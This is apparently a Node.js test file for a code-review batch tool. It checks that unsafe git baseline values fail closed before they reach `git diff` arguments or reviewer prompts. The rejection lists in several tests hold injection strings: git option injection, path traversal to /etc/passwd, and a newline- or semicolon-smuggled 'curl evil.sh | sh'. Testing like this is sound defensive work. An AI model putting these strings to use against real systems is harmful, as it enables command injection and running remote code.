import assert from "node:assert/strict";
import test from "node:test";

import {
	reviewBaselineRejectionReason,
	validateReviewBaseline,
} from "../../src/batch/batch-id.mjs";
import { buildReviewRequest } from "../../src/batch/review-step.mjs";
import {
	resolveCodeReviewScopePaths,
	resolveReviewScopePaths,
} from "../../src/batch/review-scope.mjs";

/**
 * SP-869 (#313): review baselines reach `git diff <baseline>..HEAD` argv and
 * reviewer prompt text. Unsafe values must fail the review step closed —
 * never interpolate options, traversal, or shell metacharacters.
 */

test("reviewBaselineRejectionReason accepts SHAs and plain refs", () => {
	for (const baseline of [
		"abc1234",
		"0123456789abcdef0123456789abcdef01234567",
		"main",
		"origin/main",
		"v1.2.3",
		"release-2026.11",
	]) {
		assert.equal(reviewBaselineRejectionReason(baseline), null, `expected accept: ${baseline}`);
		assert.equal(validateReviewBaseline(baseline), baseline);
	}
});

test("reviewBaselineRejectionReason rejects option-shaped, traversal, and whitespace values", () => {
	for (const baseline of [
		"--output=/tmp/pwn",
		"-x",
		"../evil",
		"main..HEAD",
		"white space",
		"main\ncurl evil.sh | sh",
		"main\r\n",
		"HEAD~1",
		"HEAD^",
		"@{u}",
		"a\\b",
		"/etc/passwd",
		"",
		"   ",
		null,
		undefined,
		42,
	]) {
		const reason = reviewBaselineRejectionReason(baseline);
		assert.ok(reason, `expected rejection: ${String(baseline)}`);
		assert.throws(
			() => validateReviewBaseline(baseline),
			/Invalid review baseline/,
			`expected throw: ${String(baseline)}`,
		);
	}
});

test("resolveCodeReviewScopePaths throws for unsafe baselines before git runs", () => {
	for (const baseline of ["../evil", "--output=/tmp/pwn", "main\ncurl evil.sh | sh", "white space"]) {
		let gitRan = false;
		assert.throws(
			() =>
				resolveCodeReviewScopePaths("/tmp/nonexistent", baseline, () => {
					gitRan = true;
					return "";
				}),
			/Invalid review baseline/,
			`expected throw: ${String(baseline)}`,
		);
		assert.equal(gitRan, false, `git must not run for: ${String(baseline)}`);
	}
});

test("resolveCodeReviewScopePaths passes a safe short SHA as a single rev argument", () => {
	const seen = [];
	const paths = resolveCodeReviewScopePaths("/tmp/nonexistent", "abc1234", (cmd, args) => {
		seen.push({ cmd, args });
		return "src/a.ts\nsrc/b.ts\n";
	});
	assert.deepEqual(seen, [{ cmd: "git", args: ["diff", "--name-only", "abc1234..HEAD"] }]);
	assert.deepEqual(paths, ["src/a.ts", "src/b.ts"]);
});

test("resolveReviewScopePaths fails closed for code and final with unsafe baseline", () => {
	for (const reviewType of ["code", "final"]) {
		assert.throws(
			() =>
				resolveReviewScopePaths({
					worktreePath: "/tmp/nonexistent",
					baseline: "--output=/tmp/pwn",
					reviewType,
					taskFolder: "/tmp/nonexistent",
					runGit: () => "",
				}),
			/Invalid review baseline/,
			`expected fail-closed throw for reviewType ${reviewType}`,
		);
	}
});

test("buildReviewRequest throws for unsafe baselines before prompt interpolation", () => {
	for (const baseline of ["../evil", "--evil=pwn", "HEAD; curl evil.sh | sh"]) {
		assert.throws(
			() =>
				buildReviewRequest({
					reviewType: "code",
					stepNumber: 1,
					taskFolder: "/tmp/nonexistent",
					worktreePath: "/tmp/nonexistent",
					outputPath: "/tmp/nonexistent/out.md",
					baseline,
				}),
			/Invalid review baseline/,
			`expected throw: ${String(baseline)}`,
		);
	}
});

test("buildReviewRequest keeps the git diff command for a safe SHA", () => {
	const prompt = buildReviewRequest({
		reviewType: "code",
		stepNumber: 1,
		taskFolder: "/tmp/nonexistent",
		worktreePath: "/tmp/nonexistent",
		outputPath: "/tmp/nonexistent/out.md",
		baseline: "abc1234",
	});
	assert.match(prompt, /git diff abc1234\.\.HEAD --name-only/);
	assert.match(prompt, /git diff abc1234\.\.HEAD/);
});
